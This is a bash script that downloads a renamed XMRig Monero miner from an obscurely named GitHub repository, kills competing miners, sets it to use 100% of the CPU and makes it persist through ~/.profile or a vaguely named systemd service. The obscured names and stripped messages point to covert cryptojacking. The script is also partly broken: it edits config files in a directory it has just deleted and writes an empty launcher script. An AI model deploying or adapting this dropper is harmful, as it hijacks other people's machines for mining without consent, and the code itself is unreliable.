#!/bin/bash

VERSION=2222
WALLET=$1
EMAIL=$2 # this one is optional

if [ -z $WALLET ]; then
  echo "ERROR: 1"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: 2"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: 3"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: 4"
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: 5"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: 6"
fi

LSCPU=`lscpu`
CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
CPU_MHZ=${CPU_MHZ%.*}
CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
  if type bc >/dev/null; then
    CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
    CPU_L1_CACHE=$( bc <<< "$CPU_L1_CACHE * 1024 / 1" )
  else
    unset CPU_L1_CACHE
  fi
fi
CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
  if type bc >/dev/null; then
    CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
    CPU_L2_CACHE=$( bc <<< "$CPU_L2_CACHE * 1024 / 1" )
  else
    unset CPU_L2_CACHE
  fi
fi
CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
  if type bc >/dev/null; then
    CPU_L3_CACHE=`echo "$CPU_L3_CACHE" | sed "s/ MiB\$//"`
    CPU_L3_CACHE=$( bc <<< "$CPU_L3_CACHE * 1024 / 1" )
  else
    unset CPU_L3_CACHE
  fi
fi
TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
power2() {
  if ! type bc >/dev/null; then
    if [ "$1" -gt "204800" ]; then
      echo "8192"
    elif [ "$1" -gt "102400" ]; then
      echo "4096"
    elif [ "$1" -gt "51200" ]; then
      echo "2048"
    elif [ "$1" -gt "25600" ]; then
      echo "1024"
    elif [ "$1" -gt "12800" ]; then
      echo "512"
    elif [ "$1" -gt "6400" ]; then
      echo "256"
    elif [ "$1" -gt "3200" ]; then
      echo "128"
    elif [ "$1" -gt "1600" ]; then
      echo "64"
    elif [ "$1" -gt "800" ]; then
      echo "32"
    elif [ "$1" -gt "400" ]; then
      echo "16"
    elif [ "$1" -gt "200" ]; then
      echo "8"
    elif [ "$1" -gt "100" ]; then
      echo "4"
    elif [ "$1" -gt "50" ]; then
      echo "2"
    else 
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
# printing intentions

sleep 15
echo
echo

# start doing stuff: preparing miner

if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig

rm -rf $HOME/moneroocean

echo "[*] Downloading"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/680642546274012521547861302794192049193/xvx/master/xv.tar.gz" -o /tmp/xv.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/680642546274012521547861302794192049193/xv/master/xv.tar.gz file to /tmp/xv.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xv.tar.gz to $HOME/mk"
[ -d $HOME/mk ] || mkdir $HOME/mk
if ! tar xf /tmp/xv.tar.gz -C $HOME/mk; then
  echo "ERROR: Can't unpack /tmp/xv.tar.gz to $HOME/mk directory"
  exit 1
fi
rm /tmp/xv.tar.gz

echo "[*] Checking"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/mk/config.json
$HOME/mk/xv --help >/dev/null

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json

cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json

# preparing script

echo "[*] Creating"
cat >$HOME/mk/m.sh <<EOL
EOL
chmod +x $HOME/mk/m.sh


if ! sudo -n true 2>/dev/null; then
  if ! grep mk/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/mk/m.sh script to $HOME/.profile"
    echo "$HOME/mk/m.sh --config=$HOME/mk/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running"
  /bin/bash $HOME/mk/m.sh --config=$HOME/mk/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running 2"
    /bin/bash $HOME/mk/m.sh --config=$HOME/mk/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating m"
    cat >/tmp/mk.service <<EOL
[Unit]
Description=mk

[Service]
ExecStart=$HOME/mk/xv --config=$HOME/mk/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/mk.service /etc/systemd/system/mk.service
    echo "[*] Starting"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable mk.service
    sudo systemctl start mk.service
  fi
fi

echo "[*] Setup complete"





